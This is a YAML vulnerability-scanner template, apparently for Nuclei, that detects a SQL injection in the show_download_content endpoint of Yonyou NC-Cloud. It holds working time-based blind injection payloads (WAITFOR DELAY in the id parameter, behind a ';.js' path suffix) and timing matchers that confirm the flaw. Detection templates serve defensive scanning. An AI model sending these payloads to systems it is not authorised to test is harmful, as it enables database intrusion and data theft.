id: yonyou-nc-cloud-content-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 用友NC-Cloud系统show_download_content接口存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。
  reference:
    - https://github.com/wy876/POC/commit/3f0a45b0ae99cbabbc28e1dfb046e83e863e1026
  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}/ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:3'--"
      - "{{BaseURL}}/ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:6'--"
      - "{{BaseURL}}/ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:9'--"
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"
